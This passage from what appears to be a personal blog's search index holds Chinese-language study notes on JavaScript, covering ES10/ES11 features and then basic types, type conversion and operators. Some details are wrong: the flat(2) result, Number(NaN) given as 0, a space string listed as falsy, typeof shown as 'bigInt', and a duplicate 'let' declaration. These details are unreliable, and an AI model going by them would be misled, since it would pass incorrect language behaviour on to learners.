class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;尚硅谷&#x27;</span>]]</span><br></pre></td></tr></table></figure><h2 id="trimStart-和-trimEnd"><a href="#trimStart-和-trimEnd" class="headerlink" title="trimStart 和 trimEnd"></a>trimStart 和 trimEnd</h2><ul><li>trimStart 清除字符串左侧空白的字符</li><li>trimEnd 清除字符串右侧空白的字符</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// trim：清除字符串两侧空白的字符</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;   iloveyou   &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">trimStart</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">trimEnd</span>());</span><br></pre></td></tr></table></figure><h2 id="Array-prototype-flat-与-flatMap"><a href="#Array-prototype-flat-与-flatMap" class="headerlink" title="Array.prototype.flat 与 flatMap"></a>Array.prototype.flat 与 flatMap</h2><p><strong>将多维数组转化为低位数组</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将多维数组转化为低位数组</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,[<span class="number">5</span>,<span class="number">6</span>]];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr.<span class="title function_">flat</span>()); <span class="comment">// [1,2,3,4,5,6]</span></span><br><span class="line"><span class="keyword">const</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,[<span class="number">5</span>,<span class="number">6</span>,[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]];</span><br><span class="line"><span class="comment">//参数为深度 是一个数字，2表示两层数组，默认值是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr1.<span class="title function_">flat</span>(<span class="number">2</span>)); <span class="comment">// [1,2,3,4,5,6,[7,8,9]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flatMap</span></span><br><span class="line"><span class="keyword">const</span> arr2 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">const</span> result1 = arr2.<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> [item * <span class="number">10</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result1); <span class="comment">// [[10], [20], [30], [40]]</span></span><br><span class="line"><span class="keyword">const</span> result = arr2.<span class="title function_">flatMap</span>(<span class="function"><span class="params">item</span> =&gt;</span> [item * <span class="number">10</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>];</span><br></pre></td></tr></table></figure><h2 id="Symbol-prototype-description"><a href="#Symbol-prototype-description" class="headerlink" title="Symbol.prototype.description"></a>Symbol.prototype.description</h2><p><strong>获取Symbol的字符串描述</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建 Symbol</span></span><br><span class="line"><span class="keyword">let</span> s = <span class="title class_">Symbol</span>(<span class="string">&#x27;尚硅谷&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="property">description</span>); <span class="comment">// 尚硅谷</span></span><br></pre></td></tr></table></figure><hr><h1 id="ES11"><a href="#ES11" class="headerlink" title="ES11"></a>ES11</h1><h2 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"><span class="comment">//公有属性</span></span><br><span class="line">  name;</span><br><span class="line">  <span class="comment">//私有属性</span></span><br><span class="line">  #age;</span><br><span class="line">  #weight;</span><br><span class="line">  <span class="comment">//构造方法</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name, age, weight</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.#age = age;</span><br><span class="line">    <span class="variable language_">this</span>.#weight = weight;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">intro</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.#age);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.#weight);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="keyword">const</span> girl = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;晓红&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;45kg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(girl.<span class="property">name</span>); <span class="comment">// 晓红</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(girl.#age); <span class="comment">// 报错</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(girl.#weight); <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line">girl.<span class="title function_">intro</span>();</span><br></pre></td></tr></table></figure><h2 id="Promise-allSettled"><a href="#Promise-allSettled" class="headerlink" title="Promise.allSettled"></a>Promise.allSettled</h2><p><strong>返回的结果始终是成功（resolve）的，成功的值是每一个promise对象执行的结果的值和状态</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明两个promise对象</span></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;商品数据 - 1&#x27;</span>);</span><br><span class="line">  &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&#x27;出错啦!&#x27;</span>);</span><br><span class="line">  &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 allsettled 方法</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">Promise</span>.<span class="title function_">allSettled</span>([p1, p2]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// p1：resolve，p2：reject</span></span><br><span class="line"><span class="comment">// Promise.all是根据promise对象的状态决定的，都成功Promise.all才成功，成功的值是数组promise成功的值组成的数组；否则失败，返回的状态是reject，失败的值是数组中出错的promise的失败的值</span></span><br><span class="line"><span class="keyword">const</span> res = <span class="title class_">Promise</span>.<span class="title function_">all</span>([p1, p2]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><h2 id="String-prototype-matchAll"><a href="#String-prototype-matchAll" class="headerlink" title="String.prototype.matchAll"></a>String.prototype.matchAll</h2><p><strong>页面中提取数据</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`&lt;ul&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;</span></span><br><span class="line"><span class="string">                &lt;a&gt;肖生克的救赎&lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;上映日期: 1994-09-10&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;</span></span><br><span class="line"><span class="string">                &lt;a&gt;阿甘正传&lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;上映日期: 1994-07-06&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明正则</span></span><br><span class="line"><span class="keyword">const</span> reg = <span class="regexp">/&lt;li&gt;.*?&lt;a&gt;(.*?)&lt;\/a&gt;.*?&lt;p&gt;(.*?)&lt;\/p&gt;/</span>sg</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用方法</span></span><br><span class="line"><span class="keyword">const</span> result = str.<span class="title function_">matchAll</span>(reg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> result)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [...result];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br></pre></td></tr></table></figure><h2 id="可选链操作符"><a href="#可选链操作符" class="headerlink" title="可选链操作符"></a>可选链操作符</h2><p><strong>符号：<code>?.</code>，使用情况：获取<code>对象层级较深</code>的属性值，解决层层判断的烦恼</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// ?.</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params">config</span>)&#123;</span><br><span class="line">  <span class="comment">// const dbHost = config &amp;&amp; config.db &amp;&amp; config.db.host;</span></span><br><span class="line">  <span class="keyword">const</span> dbHost = config?.<span class="property">db</span>?.<span class="property">host</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(dbHost);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>(&#123;</span><br><span class="line">  <span class="attr">db</span>: &#123;</span><br><span class="line">    <span class="attr">host</span>:<span class="string">&#x27;192.168.1.100&#x27;</span>,</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;root&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">cache</span>: &#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;192.168.1.200&#x27;</span>,</span><br><span class="line">    <span class="attr">username</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="动态import加载"><a href="#动态import加载" class="headerlink" title="动态import加载"></a>动态import加载</h2><p><strong>按需加载</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello.js文件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">hello</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// import * as m1 from &quot;./hello.js&quot;; // 静态</span></span><br><span class="line"><span class="comment">//获取元素</span></span><br><span class="line"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"></span><br><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 动态，import函数返回的结果是一个promise对象，promise对象成功的值就是引入的文件中暴露的对象</span></span><br><span class="line">    <span class="keyword">import</span>(<span class="string">&#x27;./hello.js&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">module</span>.<span class="title function_">hello</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BigInt-大整形"><a href="#BigInt-大整形" class="headerlink" title="BigInt 大整形"></a>BigInt 大整形</h2><p><strong>更大的数值运算</strong><br><strong>声明方式：在普通<code>数字</code>后面加<code>n</code></strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//大整形</span></span><br><span class="line"><span class="keyword">let</span> n = <span class="number">521n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(n, <span class="title function_">typeof</span>(n)); <span class="comment">// 521n &#x27;bigInt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//BigInt()函数只能针对整数，将其转为bigInt类型</span></span><br><span class="line"><span class="keyword">let</span> n = <span class="number">123</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">BigInt</span>(n)); <span class="comment">// 123n</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">BigInt</span>(<span class="number">1.2</span>)); <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//大数值运算</span></span><br><span class="line"><span class="keyword">let</span> max = <span class="title class_">Number</span>.<span class="property">MAX_SAFE_INTEGER</span>; <span class="comment">// 最大安全整数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(max);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(max + <span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(max + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">BigInt</span>(max))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">BigInt</span>(max) + <span class="title class_">BigInt</span>(<span class="number">1</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">BigInt</span>(max) + <span class="title class_">BigInt</span>(<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h2 id="globalThis"><a href="#globalThis" class="headerlink" title="globalThis"></a>globalThis</h2><p><strong>始终指向全局对象</strong></p>]]></content>
      
      
      <categories>
          
          <category> ES6-ES11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6-ES11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础篇</title>
      <link href="/2022/05/07/JavaScript/"/>
      <url>/2022/05/07/JavaScript/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h1><p><strong>JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式、声明式、函数式编程范式。</strong></p><hr><h1 id="JS-编写位置"><a href="#JS-编写位置" class="headerlink" title="JS 编写位置"></a>JS 编写位置</h1><ul><li><strong>写在标签属性中</strong><ul><li>如 button 中的 onclick 和 a 中的 href<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;我是弹窗&#x27;)&quot;</span>&gt;</span>点击出现弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;我是弹窗&#x27;)&quot;</span>&gt;</span>点击出现弹窗<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>页面中的位置</strong><ul><li><strong>javascript是可以放在任何位置</strong></li><li><strong>放在head部分</strong><ul><li>最长用的方法是在head部分位置放置script元素，浏览器解析head就会执行这个代码</li></ul></li><li><strong>放置body部分</strong><ul><li>javascript代码在页面读取到该语句时就会被执行</li></ul></li><li><strong>注意：浏览器解析HTML是按先后顺序的，前面的javascript会被先执行</strong></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;我是在head里的弹窗&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;我是在body里的弹窗&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>引用外部js文件</strong><ul><li><strong>javascript 有专门的文件夹放置，后缀为js</strong></li><li><strong>像link应用css差不多的方式 引用就可以了</strong><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure></li></ul></li><li><strong>但最好就是写在外部文件中</strong></li><li><strong>以为前两中结构和行为耦合了，不方便后期维护</strong></li></ul><hr><h1 id="JS的HelloWorld"><a href="#JS的HelloWorld" class="headerlink" title="JS的HelloWorld"></a>JS的HelloWorld</h1><ul><li><strong>alert(); 弹出警告框</strong></li><li><strong>document.write(); 向body输出一个内容</strong></li><li><strong>console.log(); 向控制台输出一个内容</strong><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;alert HelloWorld&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;write HelloWorld&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;console HelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><ul><li><strong>1、注释</strong><ul><li>/* 多行注释 */</li><li>// 单行注释</li></ul></li><li><strong>2、js中严格区分大小写</strong></li><li><strong>3、js中没一条语句以分号（;）结尾</strong><ul><li>如果不写分号，浏览器会自动添加，但会增加一些系统资源</li></ul></li><li><strong>4、js会自动忽略多个空格和换行，所以我们可以利用空格和换行对代码进行格式化</strong></li></ul><hr><h1 id="字面量和变量"><a href="#字面量和变量" class="headerlink" title="字面量和变量"></a>字面量和变量</h1><ul><li><strong>字面量，一些不可改变的值</strong><ul><li>如： 1 2 3 4 5 6 7</li><li>字面量都可以直接使用，但我们一般不会直接使用</li></ul></li><li><strong>变量，变量可以用来保存字面量，而且变量的值是可以该改变的</strong><ul><li>变量更加方便使用，一般用变量来做开发<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明变量</span></span><br><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="comment">// 为变量赋值</span></span><br><span class="line">x = <span class="number">2123123123123123</span>;</span><br></pre></td></tr></table></figure></li><li>声明和赋值可以同时进行<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">2123123123123123</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h1 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h1><ul><li><strong>在js中 所有可以由我们自足命名的都可以成为标识符</strong><ul><li><strong>如： 变量名、函数名、属性名都是标识符</strong></li><li><strong>命名一个标识符需要遵守一下规则</strong><ul><li>表示符中可以含有字母、数字、_、$</li><li>标识符不能以数字开头</li><li>标识符不能是ES中的关键字或保留字</li><li>标识符一般用采用驼峰命名法</li><li>首字母小写，每个单词的抬头字母大写，其余字母小写</li></ul></li><li><strong>js底层保存标识符时实际上采用的Unicode编码</strong><ul><li>也就是理论上 UTF-8 中所有内容都可以作为标识符</li></ul></li></ul></li></ul><hr><h1 id="数据类型（六种）"><a href="#数据类型（六种）" class="headerlink" title="数据类型（六种）"></a>数据类型（六种）</h1><ul><li><strong><code>String       字符串</code></strong></li><li><strong><code>Number       数值</code></strong></li><li><strong><code>Boolean      布尔值</code></strong></li><li><strong><code>Null         空值</code></strong></li><li><strong><code>Undefined    未定义</code></strong></li><li><strong><code>Object       对象</code></strong></li><li><strong>其中String Number Boolean Null Undefined 属于基本数据类型</strong></li><li><strong>而 Object 属于引用数据类型</strong></li><li><strong>用运算符 typeof() 可以检查出变量的数据类型</strong></li></ul><h2 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String 字符串"></a>String 字符串</h2><ul><li><strong>在js中 字符串 需要用引号引起来</strong></li><li><strong>使用双引号或单引号都可以但不能用混着用</strong></li><li><strong>单引号里面可以放双引号，双引号可以用单引号</strong></li><li><strong>用反斜杠（\） 可以转义</strong><ul><li>\“ 输出 “</li><li>\‘ 输出 ‘</li><li>\n 输出 换行</li><li>\t 输出 制表符</li></ul></li></ul><h2 id="Number-数值"><a href="#Number-数值" class="headerlink" title="Number 数值"></a>Number 数值</h2><ul><li><strong>在js中所有的数值都是Number类型</strong></li><li><strong>包括整数和浮点数</strong></li><li><strong>js中可以表示数字的最大</strong><ul><li>Number.MAX_VALUE</li></ul></li><li><strong>如果使用Number 表示的数字超过了最大值，则会显示无穷大（Infinity）</strong><ul><li>Number.MAX_VALUE * Number.MAX_VALUE</li></ul></li><li><strong>Infinity 是 字面量 可以直接表示 正无穷</strong></li><li><strong>-Infinity 是 字面量 可以直接表示 负无穷</strong></li><li><strong>NaN 表示不是数字 但是属于Number 的数据类型</strong></li><li><strong>在js中的整数的运算基本可以保证精确 但浮点数不能保证</strong><ul><li>如果使用js进行浮点元素,可能得到一个不精确的结果<ul><li>所以千万不能使用js进行精确度要求比较高的运算</li></ul></li></ul></li></ul><h2 id="Boolean-布尔值"><a href="#Boolean-布尔值" class="headerlink" title="Boolean 布尔值"></a>Boolean 布尔值</h2><ul><li><strong>true</strong><ul><li>表示逻辑上的真</li></ul></li><li><strong>false</strong><ul><li>表示逻辑上的假</li></ul></li></ul><h2 id="Null-和-Undefined"><a href="#Null-和-Undefined" class="headerlink" title="Null 和 Undefined"></a>Null 和 Undefined</h2><ul><li><strong>Null 类型的值 只有一个 表示为 空 的对象</strong><ul><li>使用 typeof 检查一个 null 时，会返回 object</li></ul></li><li><strong>Undefined 类型的值 只有一个 表示为 未定义</strong></li></ul><hr><h1 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h1><ul><li><strong>强制将数据类型转换成别的数据类型</strong></li><li><strong>主要是将 其他的数据类型 转为 String Number Boolean</strong></li></ul><h2 id="其他数据类型转换为-String"><a href="#其他数据类型转换为-String" class="headerlink" title="其他数据类型转换为 String"></a>其他数据类型转换为 String</h2><ul><li><strong>方法一：</strong><ul><li><strong>调用被 转换数据类型的 toString()方法</strong></li><li><strong>这个方法不会影响到原变量，它只会将转换的结果返回</strong><ul><li>调用变量a的toString()方法<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>利用这个方法，也可以直接改变原变量</strong><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = a.<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><ul><li>但是要注意： null 和 undefined 没有toString()方法，会报错<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="literal">null</span>;</span><br><span class="line">a = a.<span class="property">toString</span>; <span class="comment">//报错</span></span><br><span class="line">a = <span class="literal">undefined</span>;</span><br><span class="line">a = a.<span class="property">toString</span>; <span class="comment">//报错</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><strong>方法二：</strong><ul><li><strong>调用String()函数，将变量转换成字符串</strong><ul><li>使用方法和toString一样</li><li>用来转换Number 和 Boolean 时，实际上还是用 toString</li><li>但null 和 undefined 是直接加上引号 转换为 “null” 和 “undefined”</li></ul></li></ul></li></ul><hr><h2 id="其他数据类型转换为-Number"><a href="#其他数据类型转换为-Number" class="headerlink" title="其他数据类型转换为 Number"></a>其他数据类型转换为 Number</h2><ul><li><p><strong>方法一：</strong></p><ul><li><strong>调用Number()函数，来将变量转换成Number类型</strong><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">a = <span class="title class_">Number</span>(a);</span><br></pre></td></tr></table></figure></li></ul><ol><li>纯数字的字符串则直接转为 数字</li><li>如果字符串中有非数字的内容（如字母），则转为 NaN</li><li>如果字符串是一个空格或全是空格，则转为 0</li><li>如果是 Boolean 中的 true ， 则转为 1</li><li>如果是 Boolean 中的 false ， 则转为 0</li><li>如果是 NaN 则转为 0</li><li>如果是 undefined 则转为数字 NaN</li></ol><table><thead><tr><th align="center">序号</th><th align="center">原值</th><th align="center">Number()转换后</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">“123”</td><td align="center">123</td></tr><tr><td align="center">2</td><td align="center">“123asd”</td><td align="center">NaN</td></tr><tr><td align="center">3</td><td align="center">“ “或”      “</td><td align="center">0</td></tr><tr><td align="center">4</td><td align="center">true</td><td align="center">1</td></tr><tr><td align="center">5</td><td align="center">false</td><td align="center">0</td></tr><tr><td align="center">6</td><td align="center">NaN</td><td align="center">0</td></tr><tr><td align="center">7</td><td align="center">undefined</td><td align="center">NaN</td></tr></tbody></table></li><li><p><strong>方法二：针对字符串</strong></p><ul><li><strong>调用 parseInt() 函数将变量转换为Number</strong></li><li><strong>parseInt() 可以将一个字符串中的有效整数内容取出来转为 Number</strong></li><li><strong>parseFloat() 可以将一个字符串的有效小数的内容取出来 转为 Number</strong></li><li><strong>如果是对 非 String 类型 使用 parseInt() 或 parseFloat()</strong><ul><li>则会先转为 String 类型 再 使用 parseInt() 或 parseFloat()</li></ul></li></ul><table><thead><tr><th align="center">原值</th><th align="center">parseInt()转换后</th><th align="center">parseFloat()转换后</th></tr></thead><tbody><tr><td align="center">“123px”</td><td align="center">123</td><td align="center">123</td></tr><tr><td align="center">“a123px”</td><td align="center">NaN</td><td align="center">NaN</td></tr><tr><td align="center">“123abc123px”</td><td align="center">123</td><td align="center">123</td></tr><tr><td align="center">“123.123px”</td><td align="center">123</td><td align="center">123.123</td></tr><tr><td align="center">“123a.123px”</td><td align="center">123</td><td align="center">123</td></tr><tr><td align="center">“123.123”</td><td align="center">123</td><td align="center">123.123</td></tr><tr><td align="center">“010”</td><td align="center">10</td><td align="center">10</td></tr></tbody></table><p><strong>010</strong>有些浏览器直接当成<strong>八进制</strong>去转换了,需要在<strong>parseInt()<strong>或</strong>parseFloat()<strong>中添加</strong>第二个参数</strong>来表示<strong>进制</strong>（比较少用）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;010&quot;</span></span><br><span class="line">a = <span class="built_in">parseInt</span>(a,<span class="number">10</span>);</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="其他数据类型转换为-Boolean"><a href="#其他数据类型转换为-Boolean" class="headerlink" title="其他数据类型转换为 Boolean"></a>其他数据类型转换为 Boolean</h2><ul><li><strong>Number类型转Boolean</strong></li></ul><table><thead><tr><th align="center">转换前</th><th align="center">转换后</th></tr></thead><tbody><tr><td align="center">-123</td><td align="center">true</td></tr><tr><td align="center">0</td><td align="center">false</td></tr><tr><td align="center">123</td><td align="center">true</td></tr><tr><td align="center">“ “</td><td align="center">false</td></tr><tr><td align="center">‘123’</td><td align="center">true</td></tr><tr><td align="center">NaN</td><td align="center">false</td></tr><tr><td align="center">undefined</td><td align="center">false</td></tr><tr><td align="center">对象</td><td align="center">true</td></tr></tbody></table><hr><h2 id="其他进制的数字"><a href="#其他进制的数字" class="headerlink" title="其他进制的数字"></a>其他进制的数字</h2><ul><li><strong>数据前添加开头来表示各个进制</strong></li></ul><table><thead><tr><th align="center">进制</th><th align="center">转换</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">十六进制(0x)</td><td align="center">0x10</td><td align="center">16</td></tr><tr><td align="center">八进制(0)</td><td align="center">010</td><td align="center">8</td></tr><tr><td align="center">二进制(0b)</td><td align="center">0b10</td><td align="center">2</td></tr></tbody></table><hr><h1 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h1><p>对非<strong>Number</strong>进行运算时，会先转成<strong>Number</strong>再做运算<br>对<strong>两个字符串</strong>进行运算时，会<strong>直接连接起来</strong><br><strong>任何值</strong>和<strong>字符串</strong>进行<strong>加法运算</strong>，都会先转<strong>换成字符串再做运算</strong><br><strong>任意数据类型</strong> + <strong>一个’’（空字符串）</strong>即可转换到<strong>string</strong><br><strong>任何值</strong>和<strong>null</strong>运算都得<strong>null（0）</strong><br><strong>任何值做 + - * / <strong>运算都会先转成</strong>Number</strong></p><table><thead><tr><th align="center">运算符</th><th 